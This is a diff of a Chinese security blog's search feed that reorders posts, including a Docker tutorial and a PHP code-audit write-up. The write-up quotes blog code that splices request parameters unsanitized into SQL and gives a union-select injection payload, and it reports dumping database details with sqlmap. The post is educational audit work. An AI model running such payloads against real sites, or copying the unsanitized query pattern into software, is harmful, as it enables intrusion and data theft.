-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker commit -a '测试' -m 'test.txt' 98e5e9d2ee6c time/test</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0o8qzrj30i10bujsi.jpg" alt="image-20201225151301946"></p>
-<p>上传镜像到存储库(个人),首先使用docker本地登录</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker login		输入账号密码即可登录</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0ro2buj30k4041q33.jpg" alt="image-20201225152119976"></p>
-<p>上传镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker push images名</span><br></pre></td></tr></tbody></table></figure>
-
-<p>注意上传不成功，可能是因为tag名字不一致，需要和hub库的名字一致 </p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0nz26gj314009q75i.jpg" alt="image-20201225152731831"></p>
-<p>修改了名称后开始上传</p>
-<p>成功</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0q6weoj30k604w3yu.jpg" alt="image-20201225152821679"></p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0r6vddj31ik0so0we.jpg" alt="image-20201225152846139"></p>
-<h3 id="0x02-构建镜像"><a href="#0x02-构建镜像" class="headerlink" title="0x02 构建镜像"></a>0x02 构建镜像</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker build</span><br></pre></td></tr></tbody></table></figure>
-
-<p>Dockerfile常用指令</p>
-<table>
-<thead>
-<tr>
-<th>类型</th>
-<th>命令</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>基础镜像信息</td>
-<td>FROM</td>
-</tr>
-<tr>
-<td>维护者信息</td>
-<td>MAINTAINER</td>
-</tr>
-<tr>
-<td>镜像操作指令</td>
-<td>RUN、COPY、ADD、EXPOSE、WORKDIR、ONBUILD、USER、VOLUME等</td>
-</tr>
-<tr>
-<td>容器启动时执行命令</td>
-<td>CMD、ENTRYPOINT</td>
-</tr>
-</tbody></table>
-<p>创建Dockerfile文件,以下命令是安装基于ubuntu安装redis，并映射端口，具体使用方法可参考菜鸟教程中的docker教程</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">FROM centos		//使用centos版本作为基础镜像</span><br><span class="line">MAINTAINER Time 892732389@qq.com	//创建者信息</span><br><span class="line">RUN yum update \		//创建后执行命令，更新系统并安装常用系统组件</span><br><span class="line">	&amp;&amp; yum install -y gcc make pcre-devel zlib-devel tar zlib wget</span><br><span class="line">RUN wget http://download.redis.io/releases/redis-4.0.10.tar.gz \  //下载redis</span><br><span class="line">	&amp;&amp; tar -zxf redis-4.0.10.tar.gz \	//解压</span><br><span class="line">	&amp;&amp; cd redis-4.0.10 \		//进入文件夹</span><br><span class="line">	&amp;&amp; make \			//编译</span><br><span class="line">	&amp;&amp; make install</span><br><span class="line">EXPOSE 6937		//开启外部端口方便镜像端口映射</span><br><span class="line">CMD redis-server		//启动redis</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0otsscj318k0jumzs.jpg" alt="image-20201226005613525"></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker build -t centos_redis:v1 .	//构造镜像命令</span><br></pre></td></tr></tbody></table></figure>
-
-<p>构造成功</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0qui7xj31120u0dlo.jpg" alt="image-20201226010531825"></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker run -d -p 6379:6379 centos_redis:v1</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0s91jej31fo0u0tin.jpg" alt="image-20201226010730558"></p>
-<h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><p>菜鸟教程：<a href="https://m.runoob.com/docker/">https://m.runoob.com/docker/</a></p>
-<p><a href="https://www.cnblogs.com/jsonhc/p/7767669.html">https://www.cnblogs.com/jsonhc/p/7767669.html</a></p>
-<p><a href="https://www.cnblogs.com/momoyan/p/12437312.html">https://www.cnblogs.com/momoyan/p/12437312.html</a></p>
-]]></content>
-      <categories>
-        <category>Docker</category>
-      </categories>
-      <tags>
-        <tag>docker基础</tag>
       </tags>
   </entry>
   <entry>
@@ -2457,7 +2457,7 @@
 <h3 id="保留字符和百分号编码"><a href="#保留字符和百分号编码" class="headerlink" title="保留字符和百分号编码"></a>保留字符和百分号编码</h3><p>由于某些字符和百分号编码可能需要用到，所以RFC未禁用也未规定详细用法，所以会经常见到%2F、%00等字符，或者在测试中利用这些字符进行攻击等。(个人大概这样理解)</p>
 ]]></content>
       <categories>
-        <category>WEB之困</category>
+        <category>渗透测试</category>
       </categories>
   </entry>
   <entry>
@@ -3107,66 +3107,6 @@
       </categories>
   </entry>
   <entry>
-    <title>李雷PHP博客程序之初级代码审计</title>
-    <url>/2020/09/01/%E6%9D%8E%E9%9B%B7PHP%E5%8D%9A%E5%AE%A2%E7%A8%8B%E5%BA%8F%E4%B9%8B%E5%88%9D%E7%BA%A7%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gib52pcc45j31c00u0e81.jpg"></p>
-<span id="more"></span>
-
-<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h3><p>作为菜鸡做审计，又不想看着大佬们的文章一步一步的跟进漏洞点，所以在CVND找了一套源码，提示在new*_sh*.php存在注入，然后官网下载一个源码直接开刚。。</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gib7mww1inj30j41bgjw1.jpg" alt="image-20200901160400224"></p>
-<p>作者部分借用了Thinkphp框架，但是大部分都是自己原生写法。。。mdaima_var_inc核心类、配置文件、函数等，mdaima_com_admin后台文件,外置的其他文件为前台文件。</p>
-<h3 id="0x01-news-show文件SQL注入"><a href="#0x01-news-show文件SQL注入" class="headerlink" title="0x01 news_show文件SQL注入"></a>0x01 news_show文件SQL注入</h3><p>根据CVND大佬提示，找到符合提示文件的只有news_show文件，查看代码</p>
-<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"./mdaima_var_inc/config_system.php"</span>);</span><br><span class="line"><span class="variable">$wap_mobile</span>=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> (isMobile() &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">"mobile_wap"</span>]!=<span class="string">'pc'</span>){</span><br><span class="line">	<span class="variable">$wap_mobile</span>=<span class="string">'true'</span>;</span><br><span class="line">	<span class="keyword">include_once</span>(<span class="string">"wap/news_show_wap.php"</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"./mdaima_var_inc/config_system_info.php"</span>);<span class="comment">//必须先调用获取基本参数</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"./mdaima_var_inc/conn.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//此处使用任意方式传参接收</span></span><br><span class="line"><span class="variable">$cid</span>=<span class="variable">$_REQUEST</span>[<span class="string">"id"</span>];</span><br><span class="line"><span class="variable">$page_1</span>=<span class="variable">$_REQUEST</span>[<span class="string">"page_1"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">'blog_lileiuser'</span>]!=<span class="string">""</span> &amp;&amp; <span class="variable">$_REQUEST</span>[<span class="string">'see'</span>]==<span class="string">'true'</span>){<span class="comment">//为后台预览效果准备</span></span><br><span class="line">	<span class="variable">$pass_str</span>=<span class="string">""</span>;</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">	<span class="variable">$pass_str</span>=<span class="string">" and pass='1' "</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//此处拼接SQL语句</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"select * from lei_news where id='"</span>.<span class="variable">$cid</span>.<span class="string">"' "</span>.<span class="variable">$pass_str</span>.<span class="string">" limit 1 "</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rs</span>=<span class="variable">$result</span>-&gt;fetch_assoc()){</span><br><span class="line">	<span class="variable">$title</span>=<span class="variable">$rs</span>[<span class="string">"title"</span>];</span><br><span class="line">	<span class="variable">$indate</span>=<span class="variable">$rs</span>[<span class="string">"indate"</span>];</span><br><span class="line">	<span class="variable">$laiyuan</span>=<span class="variable">$rs</span>[<span class="string">"laiyuan"</span>];</span><br><span class="line">	<span class="variable">$guanjianci</span>=<span class="variable">$rs</span>[<span class="string">"guanjianci"</span>];</span><br><span class="line">	<span class="variable">$simgpaths</span>=<span class="variable">$rs</span>[<span class="string">"simgpaths"</span>];</span><br><span class="line">	<span class="variable">$hits</span>=<span class="variable">$rs</span>[<span class="string">"hits"</span>]+<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$message</span>=<span class="variable">$rs</span>[<span class="string">"message"</span>];</span><br><span class="line">	<span class="variable">$pass</span>=<span class="variable">$rs</span>[<span class="string">"pass"</span>];</span><br><span class="line">	<span class="variable">$pinglun</span>=<span class="variable">$rs</span>[<span class="string">"pinglun"</span>];</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"文章不存在！"</span>;</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;close();</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">} </span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"update lei_news set hits='"</span>.<span class="variable">$hits</span>.<span class="string">"' where id='"</span>.<span class="variable">$cid</span>.<span class="string">"' limit 1"</span>;<span class="comment">//更新访问人数</span></span><br><span class="line"><span class="variable">$mysqli</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
-
-<p>可以发现上面一段代码是没有做任何过滤的，看了下作者写的安全函数，只对POST传参方式进行了过滤，但是没有对$_REQUERY和$_GET方式及$_COOKIE进行过滤,所以这里就是一点很典型的注入了。。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">漏洞点：http://lilei.com/news_show.php?id=1&amp;page_1=1</span><br></pre></td></tr></tbody></table></figure>
-
-<p>开启调试模式，查看程序执行的流程</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">	http://lilei.com/news_show.php?id=1%27%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13%23&amp;page_1=1</span><br></pre></td></tr></tbody></table></figure>
-
-<p>获取传递的参数值，并且由于传参方式未做处理，因此将注入语句全部获取</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gib9vmubozj315o0u0qa0.jpg" alt="image-20200901172137279"></p>
-<p>完整带入数据库并执行</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1giba058149j31550u0108.jpg" alt="image-20200901172557060"></p>
-<p>爆出数据库、数据库版本、数据库用户</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gibabi0p20j31db0u00zp.jpg" alt="image-20200901173652116"></p>
-<p>后续也不在手工，直接sqlmap一把梭了。。。</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gibaizcv0qj31hj0u0hdt.jpg" alt="image-20200901174402867"></p>
-<h3 id="0x01-jingyan-show文件SQL注入"><a href="#0x01-jingyan-show文件SQL注入" class="headerlink" title="0x01 jingyan_show文件SQL注入"></a>0x01 jingyan_show文件SQL注入</h3><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"./mdaima_var_inc/config_system.php"</span>);</span><br><span class="line"><span class="variable">$wap_mobile</span>=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> (isMobile() &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">"mobile_wap"</span>]!=<span class="string">'pc'</span>){</span><br><span class="line">	<span class="variable">$wap_mobile</span>=<span class="string">'true'</span>;</span><br><span class="line">	<span class="keyword">include_once</span>(<span class="string">"wap/jingyan_show_wap.php"</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"./mdaima_var_inc/config_system_info.php"</span>);<span class="comment">//�����ȵ��û�ȡ��������</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"./mdaima_var_inc/conn.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cid</span>=<span class="variable">$_REQUEST</span>[<span class="string">"id"</span>];</span><br><span class="line"><span class="variable">$page_1</span>=<span class="variable">$_REQUEST</span>[<span class="string">"page_1"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">'blog_lileiuser'</span>]!=<span class="string">""</span> &amp;&amp; <span class="variable">$_REQUEST</span>[<span class="string">'see'</span>]==<span class="string">'true'</span>){<span class="comment">//Ϊ��̨Ԥ��Ч��׼��</span></span><br><span class="line">	<span class="variable">$pass_str</span>=<span class="string">""</span>;</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">	<span class="variable">$pass_str</span>=<span class="string">" and pass='1' "</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"select * from lei_jingyan where id='"</span>.<span class="variable">$cid</span>.<span class="string">"' "</span>.<span class="variable">$pass_str</span>.<span class="string">" limit 1 "</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rs</span>=<span class="variable">$result</span>-&gt;fetch_assoc()){</span><br><span class="line">	<span class="variable">$title</span>=<span class="variable">$rs</span>[<span class="string">"title"</span>];</span><br><span class="line">	<span class="variable">$indate</span>=<span class="variable">$rs</span>[<span class="string">"indate"</span>];</span><br><span class="line">	<span class="variable">$laiyuan</span>=<span class="variable">$rs</span>[<span class="string">"laiyuan"</span>];</span><br><span class="line">	<span class="variable">$guanjianci</span>=<span class="variable">$rs</span>[<span class="string">"guanjianci"</span>];</span><br><span class="line">	<span class="variable">$simgpaths</span>=<span class="variable">$rs</span>[<span class="string">"simgpaths"</span>];</span><br><span class="line">	<span class="variable">$hits</span>=<span class="variable">$rs</span>[<span class="string">"hits"</span>]+<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$message</span>=<span class="variable">$rs</span>[<span class="string">"message"</span>];</span><br><span class="line">	<span class="variable">$pass</span>=<span class="variable">$rs</span>[<span class="string">"pass"</span>];</span><br><span class="line">	<span class="variable">$shipin</span>=<span class="variable">$rs</span>[<span class="string">"shipin"</span>];</span><br><span class="line">	<span class="variable">$pinglun</span>=<span class="variable">$rs</span>[<span class="string">"pinglun"</span>];</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"���²����ڣ�"</span>;</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;close();</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">} </span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"update lei_jingyan set hits='"</span>.<span class="variable">$hits</span>.<span class="string">"' where id='"</span>.<span class="variable">$cid</span>.<span class="string">"' limit 1"</span>;<span class="comment">//���·�������</span></span><br><span class="line"><span class="variable">$mysqli</span>-&gt;query(<span class="variable">$sql</span>);</span><br></pre></td></tr></tbody></table></figure>
-
-<p>此文件中的漏洞点同news_show文件中的漏洞点一样，还有几个同类型的漏洞点代码如下</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></tbody></table></figure>
-
-
-
-<p>sendmail    文件读取</p>
-]]></content>
-      <categories>
-        <category>代码审计</category>
-      </categories>
-      <tags>
-        <tag>审计学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记一次OneThinkPHP的审计学习（暂未更新）</title>
-    <url>/2020/11/15/%E8%AE%B0%E4%B8%80%E6%AC%A1OneThinkPHP%E7%9A%84%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0i0k2thdj30sg0sgdku.jpg" alt="95"></p>
-<span id="more"></span>
-
-<p>CMS：OneThinkphp 1.0</p>
-<h3 id="0x01-文件缓存漏洞"><a href="#0x01-文件缓存漏洞" class="headerlink" title="0x01 文件缓存漏洞"></a>0x01 文件缓存漏洞</h3><p>1、在Thninkphp.php中文件缓存目录定义为Runtime/Temp</p>
-<p>在<code>ThinkPHP/Conf/convenion.php</code>中同时定义了<code>DATA_CACHE_PATH</code>也为<code>Runtime/Temp</code>:</p>
-<p>在<code>Think/Cache/Driver/File.class.php</code>中构造函数定义了File缓存类的<code>options['temp']</code>为<code>DATA_CACHE_PATH</code>，因此File缓存类的存放路径在<code>Runtime/Temp/</code></p>
-]]></content>
-      <categories>
-        <category>代码审计</category>
-      </categories>
-      <tags>
-        <tag>代码审计，学习笔记</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>隐藏通信隧道技术</title>
     <url>/2020/02/18/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ymrod8pj31hc0u00yf.jpg" alt="99"></p>
@@ -3522,6 +3462,24 @@
       </categories>
   </entry>
   <entry>
+    <title>记一次OneThinkPHP的审计学习（暂未更新）</title>
+    <url>/2020/11/15/%E8%AE%B0%E4%B8%80%E6%AC%A1OneThinkPHP%E7%9A%84%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0i0k2thdj30sg0sgdku.jpg" alt="95"></p>
+<span id="more"></span>
+
+<p>CMS：OneThinkphp 1.0</p>
+<h3 id="0x01-文件缓存漏洞"><a href="#0x01-文件缓存漏洞" class="headerlink" title="0x01 文件缓存漏洞"></a>0x01 文件缓存漏洞</h3><p>1、在Thninkphp.php中文件缓存目录定义为Runtime/Temp</p>
+<p>在<code>ThinkPHP/Conf/convenion.php</code>中同时定义了<code>DATA_CACHE_PATH</code>也为<code>Runtime/Temp</code>:</p>
+<p>在<code>Think/Cache/Driver/File.class.php</code>中构造函数定义了File缓存类的<code>options['temp']</code>为<code>DATA_CACHE_PATH</code>，因此File缓存类的存放路径在<code>Runtime/Temp/</code></p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>代码审计，学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Acid靶机实战</title>
     <url>/2019/07/21/Acid%E9%9D%B6%E6%9C%BA/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ynsl44uj31c00u044d.jpg" alt="99"></p>
@@ -3567,6 +3525,48 @@
       </categories>
       <tags>
         <tag>靶场实战</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>李雷PHP博客程序之初级代码审计</title>
+    <url>/2020/09/01/%E6%9D%8E%E9%9B%B7PHP%E5%8D%9A%E5%AE%A2%E7%A8%8B%E5%BA%8F%E4%B9%8B%E5%88%9D%E7%BA%A7%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gib52pcc45j31c00u0e81.jpg"></p>
+<span id="more"></span>
+
+<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h3><p>作为菜鸡做审计，又不想看着大佬们的文章一步一步的跟进漏洞点，所以在CVND找了一套源码，提示在new*_sh*.php存在注入，然后官网下载一个源码直接开刚。。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gib7mww1inj30j41bgjw1.jpg" alt="image-20200901160400224"></p>
+<p>作者部分借用了Thinkphp框架，但是大部分都是自己原生写法。。。mdaima_var_inc核心类、配置文件、函数等，mdaima_com_admin后台文件,外置的其他文件为前台文件。</p>
+<h3 id="0x01-news-show文件SQL注入"><a href="#0x01-news-show文件SQL注入" class="headerlink" title="0x01 news_show文件SQL注入"></a>0x01 news_show文件SQL注入</h3><p>根据CVND大佬提示，找到符合提示文件的只有news_show文件，查看代码</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"./mdaima_var_inc/config_system.php"</span>);</span><br><span class="line"><span class="variable">$wap_mobile</span>=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> (isMobile() &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">"mobile_wap"</span>]!=<span class="string">'pc'</span>){</span><br><span class="line">	<span class="variable">$wap_mobile</span>=<span class="string">'true'</span>;</span><br><span class="line">	<span class="keyword">include_once</span>(<span class="string">"wap/news_show_wap.php"</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"./mdaima_var_inc/config_system_info.php"</span>);<span class="comment">//必须先调用获取基本参数</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"./mdaima_var_inc/conn.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//此处使用任意方式传参接收</span></span><br><span class="line"><span class="variable">$cid</span>=<span class="variable">$_REQUEST</span>[<span class="string">"id"</span>];</span><br><span class="line"><span class="variable">$page_1</span>=<span class="variable">$_REQUEST</span>[<span class="string">"page_1"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">'blog_lileiuser'</span>]!=<span class="string">""</span> &amp;&amp; <span class="variable">$_REQUEST</span>[<span class="string">'see'</span>]==<span class="string">'true'</span>){<span class="comment">//为后台预览效果准备</span></span><br><span class="line">	<span class="variable">$pass_str</span>=<span class="string">""</span>;</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">	<span class="variable">$pass_str</span>=<span class="string">" and pass='1' "</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//此处拼接SQL语句</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"select * from lei_news where id='"</span>.<span class="variable">$cid</span>.<span class="string">"' "</span>.<span class="variable">$pass_str</span>.<span class="string">" limit 1 "</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rs</span>=<span class="variable">$result</span>-&gt;fetch_assoc()){</span><br><span class="line">	<span class="variable">$title</span>=<span class="variable">$rs</span>[<span class="string">"title"</span>];</span><br><span class="line">	<span class="variable">$indate</span>=<span class="variable">$rs</span>[<span class="string">"indate"</span>];</span><br><span class="line">	<span class="variable">$laiyuan</span>=<span class="variable">$rs</span>[<span class="string">"laiyuan"</span>];</span><br><span class="line">	<span class="variable">$guanjianci</span>=<span class="variable">$rs</span>[<span class="string">"guanjianci"</span>];</span><br><span class="line">	<span class="variable">$simgpaths</span>=<span class="variable">$rs</span>[<span class="string">"simgpaths"</span>];</span><br><span class="line">	<span class="variable">$hits</span>=<span class="variable">$rs</span>[<span class="string">"hits"</span>]+<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$message</span>=<span class="variable">$rs</span>[<span class="string">"message"</span>];</span><br><span class="line">	<span class="variable">$pass</span>=<span class="variable">$rs</span>[<span class="string">"pass"</span>];</span><br><span class="line">	<span class="variable">$pinglun</span>=<span class="variable">$rs</span>[<span class="string">"pinglun"</span>];</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"文章不存在！"</span>;</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;close();</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">} </span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"update lei_news set hits='"</span>.<span class="variable">$hits</span>.<span class="string">"' where id='"</span>.<span class="variable">$cid</span>.<span class="string">"' limit 1"</span>;<span class="comment">//更新访问人数</span></span><br><span class="line"><span class="variable">$mysqli</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以发现上面一段代码是没有做任何过滤的，看了下作者写的安全函数，只对POST传参方式进行了过滤，但是没有对$_REQUERY和$_GET方式及$_COOKIE进行过滤,所以这里就是一点很典型的注入了。。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">漏洞点：http://lilei.com/news_show.php?id=1&amp;page_1=1</span><br></pre></td></tr></tbody></table></figure>
+
+<p>开启调试模式，查看程序执行的流程</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">	http://lilei.com/news_show.php?id=1%27%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13%23&amp;page_1=1</span><br></pre></td></tr></tbody></table></figure>
+
+<p>获取传递的参数值，并且由于传参方式未做处理，因此将注入语句全部获取</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gib9vmubozj315o0u0qa0.jpg" alt="image-20200901172137279"></p>
+<p>完整带入数据库并执行</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1giba058149j31550u0108.jpg" alt="image-20200901172557060"></p>
+<p>爆出数据库、数据库版本、数据库用户</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gibabi0p20j31db0u00zp.jpg" alt="image-20200901173652116"></p>
+<p>后续也不在手工，直接sqlmap一把梭了。。。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gibaizcv0qj31hj0u0hdt.jpg" alt="image-20200901174402867"></p>
+<h3 id="0x01-jingyan-show文件SQL注入"><a href="#0x01-jingyan-show文件SQL注入" class="headerlink" title="0x01 jingyan_show文件SQL注入"></a>0x01 jingyan_show文件SQL注入</h3><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"./mdaima_var_inc/config_system.php"</span>);</span><br><span class="line"><span class="variable">$wap_mobile</span>=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> (isMobile() &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">"mobile_wap"</span>]!=<span class="string">'pc'</span>){</span><br><span class="line">	<span class="variable">$wap_mobile</span>=<span class="string">'true'</span>;</span><br><span class="line">	<span class="keyword">include_once</span>(<span class="string">"wap/jingyan_show_wap.php"</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"./mdaima_var_inc/config_system_info.php"</span>);<span class="comment">//�����ȵ��û�ȡ��������</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"./mdaima_var_inc/conn.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cid</span>=<span class="variable">$_REQUEST</span>[<span class="string">"id"</span>];</span><br><span class="line"><span class="variable">$page_1</span>=<span class="variable">$_REQUEST</span>[<span class="string">"page_1"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">'blog_lileiuser'</span>]!=<span class="string">""</span> &amp;&amp; <span class="variable">$_REQUEST</span>[<span class="string">'see'</span>]==<span class="string">'true'</span>){<span class="comment">//Ϊ��̨Ԥ��Ч��׼��</span></span><br><span class="line">	<span 